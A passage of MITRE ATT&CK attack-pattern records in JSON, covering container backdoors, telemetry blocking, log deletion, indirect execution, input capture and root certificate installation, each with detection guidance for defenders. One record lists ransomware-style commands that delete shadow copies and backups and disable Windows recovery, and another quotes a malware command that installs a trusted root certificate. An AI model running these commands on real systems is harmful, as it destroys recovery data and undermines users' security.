    "{\"created\":\"2019-09-04T12:04:03.552Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may implant cloud container images with malicious code to establish persistence. Amazon Web Service (AWS) Amazon Machine Images (AMI), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\\n\\nA tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019) Adversaries may also implant Docker images that may be inadvertently used in cloud deployments, which has been reported in some instances of cryptomining botnets.(Citation: ATT Cybersecurity Cryptocurrency Attacks on Cloud) \",\"external_references\":[{\"external_id\":\"T1525\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1525\"},{\"description\":\"Rhino Labs. (2019, August). Exploiting AWS ECR and ECS with the Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019.\",\"source_name\":\"Rhino Labs Cloud Image Backdoor Technique Sept 2019\",\"url\":\"https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/\"},{\"description\":\"Rhino Labs. (2019, September). Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019.\",\"source_name\":\"Rhino Labs Cloud Backdoor September 2019\",\"url\":\"https://github.com/RhinoSecurityLabs/ccat\"},{\"description\":\"Doman, C. & Hegel, T.. (2019, March 14). Making it Rain - Cryptocurrency Mining Attacks in the Cloud. Retrieved October 3, 2019.\",\"source_name\":\"ATT Cybersecurity Cryptocurrency Attacks on Cloud\",\"url\":\"https://www.alienvault.com/blogs/labs-research/making-it-rain-cryptocurrency-mining-attacks-in-the-cloud\"}],\"id\":\"attack-pattern--4fd8a28b-4b3a-4cd6-a8cf-85ba5f824a7f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-25T22:47:34.137Z\",\"name\":\"Implant Container Image\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Asset management\"],\"x_mitre_detection\":\"Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"GCP\",\"Azure\",\"AWS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:47.384Z\",\"external_references\":[{\"external_id\":\"T1054\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1054\"},{\"external_id\":\"CAPEC-571\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/571.html\"},{\"description\":\"Microsoft. (2009, May 17). Backdoor:Win32/Lamin.A. Retrieved September 6, 2018.\",\"source_name\":\"Microsoft Lamin Sept 2017\",\"url\":\"https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Backdoor:Win32/Lamin.A\"},{\"description\":\"Microsoft. (2018, May 30). About Event Tracing. Retrieved June 7, 2019.\",\"source_name\":\"Microsoft About Event Tracing 2018\",\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/etw/consuming-events\"},{\"description\":\"Palantir. (2018, December 24). Tampering with Windows Event Tracing: Background, Offense, and Defense. Retrieved June 7, 2019.\",\"source_name\":\"Medium Event Tracing Tampering 2018\",\"url\":\"https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63\"}],\"id\":\"attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df\",\"modified\":\"2020-03-19T19:10:25.404Z\",\"name\":\"Indicator Blocking\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-19T19:09:30.329Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\\n\\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\\n\\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. \",\"external_references\":[{\"external_id\":\"T1562.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1562/006\"},{\"external_id\":\"CAPEC-571\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/571.html\"},{\"description\":\"Microsoft. (2009, May 17). Backdoor:Win32/Lamin.A. Retrieved September 6, 2018.\",\"source_name\":\"Microsoft Lamin Sept 2017\",\"url\":\"https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Backdoor:Win32/Lamin.A\"},{\"description\":\"Microsoft. (2018, May 30). About Event Tracing. Retrieved June 7, 2019.\",\"source_name\":\"Microsoft About Event Tracing 2018\",\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/etw/consuming-events\"},{\"description\":\"Palantir. (2018, December 24). Tampering with Windows Event Tracing: Background, Offense, and Defense. Retrieved June 7, 2019.\",\"source_name\":\"Medium Event Tracing Tampering 2018\",\"url\":\"https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63\"}],\"id\":\"attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-19T19:20:39.087Z\",\"name\":\"Indicator Blocking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Rob Smith\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Sensor health and status\"],\"x_mitre_defense_bypassed\":[\"Host intrusion prevention systems\",\"Anti-virus\",\"Anti-virus\"],\"x_mitre_detection\":\"Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\\n\\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\AUTOLOGGER_NAME\\\\{PROVIDER_GUID}</code>\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:54.176Z\",\"external_references\":[{\"external_id\":\"T1066\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1066\"}],\"id\":\"attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6\",\"modified\":\"2020-03-20T15:22:53.835Z\",\"name\":\"Indicator Removal from Tools\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-19T21:27:32.820Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target\'s defensive systems or subsequent targets that may use similar systems.\\n\\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.\",\"external_references\":[{\"external_id\":\"T1027.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1027/005\"}],\"id\":\"attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:03:09.766Z\",\"name\":\"Indicator Removal from Tools\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"Anti-virus\",\"Binary file metadata\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Host intrusion prevention systems\",\"Log analysis\",\"Signature-based detection\"],\"x_mitre_detection\":\"The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:55.892Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/*.\\n\\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.\",\"external_references\":[{\"external_id\":\"T1070\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1070\"},{\"external_id\":\"CAPEC-93\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/93.html\"}],\"id\":\"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:43:29.196Z\",\"name\":\"Indicator Removal on Host\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ed Williams, Trustwave, SpiderLabs\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"API monitoring\",\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"Log analysis\",\"Host intrusion prevention systems\",\"Anti-virus\"],\"x_mitre_detection\":\"File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\\n\\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.\",\"external_references\":[{\"external_id\":\"T1202\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1202\"},{\"description\":\"vector_sec. (2017, August 11). Defenders watching launches of cmd? What about forfiles?. Retrieved January 22, 2018.\",\"source_name\":\"VectorSec ForFiles Aug 2017\",\"url\":\"https://twitter.com/vector_sec/status/896049052642533376\"},{\"description\":\"Evi1cg. (2017, November 26). block cmd.exe ? try this :. Retrieved January 22, 2018.\",\"source_name\":\"Evi1cg Forfiles Nov 2017\",\"url\":\"https://twitter.com/Evi1cg/status/935027922397573120\"},{\"description\":\"Partington, E. (2017, August 14). Are you looking out for forfiles.exe (if you are watching for cmd.exe). Retrieved January 22, 2018.\",\"source_name\":\"RSA Forfiles Aug 2017\",\"url\":\"https://community.rsa.com/community/products/netwitness/blog/2017/08/14/are-you-looking-out-for-forfilesexe-if-you-are-watching-for-cmdexe\"}],\"id\":\"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:09:22.559Z\",\"name\":\"Indirect Command Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matthew Demaske, Adaptforward\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"Static File Analysis\",\"Application control\",\"Application control by file name or path\"],\"x_mitre_detection\":\"Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections. (Citation: RSA Forfiles Aug 2017)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:31:16.408Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\",\"external_references\":[{\"external_id\":\"T1105\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1105\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-20T15:42:48.595Z\",\"name\":\"Ingress Tool Transfer\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"File monitoring\",\"Packet capture\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2019-04-02T13:54:43.136Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)\\n\\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\\n\\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\",\"external_references\":[{\"external_id\":\"T1490\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1490\"},{\"description\":\"Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.\",\"source_name\":\"Talos Olympic Destroyer 2018\",\"url\":\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"},{\"description\":\"Berry, A., Homan, J., and Eitzman, R. (2017, May 23). WannaCry Malware Profile. Retrieved March 15, 2019.\",\"source_name\":\"FireEye WannaCry 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html\"}],\"id\":\"attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2019-07-19T14:37:37.347Z\",\"name\":\"Inhibit System Recovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Yonatan Gotlib, Deep Instinct\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"Services\",\"Windows event logs\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.\\n\\nMonitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\\\\Software\\\\Policies\\\\Microsoft\\\\PreviousVersions\\\\DisableLocalPage</code>).\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_permissions_required\":[\"Administrator\",\"root\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:48.323Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).\",\"external_references\":[{\"external_id\":\"T1056\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1056\"},{\"external_id\":\"CAPEC-569\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/569.html\"},{\"description\":\"Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.\",\"source_name\":\"Adventures of a Keystroke\",\"url\":\"http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf\"}],\"id\":\"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T21:29:13.900Z\",\"name\":\"Input Capture\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"John Lambert, Microsoft Threat Intelligence Center\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"Windows event logs\",\"User interface\",\"Process command-line parameters\",\"Process monitoring\",\"PowerShell logs\",\"Loaded DLLs\",\"Kernel drivers\",\"DLL monitoring\",\"Binary file metadata\",\"API monitoring\"],\"x_mitre_detection\":\"Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"root\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1141\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1141\"},{\"external_id\":\"CAPEC-569\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/569.html\"},{\"description\":\"Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits Mackeeper. Retrieved July 3, 2017.\",\"source_name\":\"OSX Malware Exploits MacKeeper\",\"url\":\"https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html\"},{\"description\":\"Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved December 17, 2018.\",\"source_name\":\"LogRhythm Do You Trust Oct 2014\",\"url\":\"https://logrhythm.com/blog/do-you-trust-your-computer/\"},{\"description\":\"Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.\",\"source_name\":\"OSX Keydnap malware\",\"url\":\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\"},{\"description\":\"Nelson, M. (2015, January 21). Phishing for Credentials: If you want it, just ask!. Retrieved December 17, 2018.\",\"source_name\":\"Enigma Phishing for Credentials Jan 2015\",\"url\":\"https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/\"}],\"id\":\"attack-pattern--91ce1ede-107f-4d8b-bf4c-735e8789c94b\",\"modified\":\"2020-02-12T16:34:06.412Z\",\"name\":\"Input Prompt\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2017-05-31T21:31:42.750Z\",\"external_references\":[{\"external_id\":\"T1130\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1130\"},{\"external_id\":\"CAPEC-479\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/479.html\"},{\"description\":\"Wikipedia. (2016, December 6). Root certificate. Retrieved February 20, 2017.\",\"source_name\":\"Wikipedia Root Certificate\",\"url\":\"https://en.wikipedia.org/wiki/Root_certificate\"},{\"description\":\"Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.\",\"source_name\":\"Operation Emmental\",\"url\":\"http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf\"},{\"description\":\"Onuma. (2015, February 24). Superfish: Adware Preinstalled on Lenovo Laptops. Retrieved February 20, 2017.\",\"source_name\":\"Kaspersky Superfish\",\"url\":\"https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/\"},{\"description\":\"Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.\",\"source_name\":\"SpectorOps Code Signing Dec 2017\",\"url\":\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\"},{\"description\":\"Patrick Wardle. (2018, January 11). Ay MaMi. Retrieved March 19, 2018.\",\"source_name\":\"objective-see ay mami 2018\",\"url\":\"https://objective-see.com/blog/blog_0x26.html\"},{\"description\":\"Russinovich, M. et al.. (2017, May 22). Sigcheck. Retrieved April 3, 2018.\",\"source_name\":\"Microsoft Sigcheck May 2017\",\"url\":\"https://docs.microsoft.com/sysinternals/downloads/sigcheck\"},{\"description\":\"Smith, T. (2016, October 27). AppUNBlocker: Bypassing AppLocker. Retrieved December 19, 2017.\",\"source_name\":\"Tripwire AppUNBlocker\",\"url\":\"https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/\"}],\"id\":\"attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1\",\"modified\":\"2020-02-21T21:11:06.761Z\",\"name\":\"Install Root Certificate\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-21T21:05:32.844Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root\'s chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\\n\\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\\n\\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\\n\\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\\n\\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)\",\"external_references\":[{\"external_id\":\"T1553.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1553/004\"},{\"external_id\":\"CAPEC-479\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/479.html\"},{\"description\":\"Wikipedia. (2016, December 6). Root certificate. Retrieved February 20, 2017.\",\"source_name\":\"Wikipedia Root Certificate\",\"url\":\"https://en.wikipedia.org/wiki/Root_certificate\"},{\"description\":\"Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.\",\"source_name\":\"Operation Emmental\",\"url\":\"http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf\"},{\"description\":\"Onuma. (2015, February 24). Superfish: Adware Preinstalled on Lenovo Laptops. Retrieved February 20, 2017.\",\"source_name\":\"Kaspersky Superfish\",\"url\":\"https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/\"},{\"description\":\"Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.\",\"source_name\":\"SpectorOps Code Signing Dec 2017\",\"url\":\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\"},{\"description\":\"Patrick Wardle. (2018, January 11). Ay MaMi. Retrieved March 19, 2018.\",\"source_name\":\"objective-see ay mami 2018\",\"url\":\"https://objective-see.com/blog/blog_0x26.html\"},{\"description\":\"Russinovich, M. et al.. (2017, May 22). Sigcheck. Retrieved April 3, 2018.\",\"source_name\":\"Microsoft 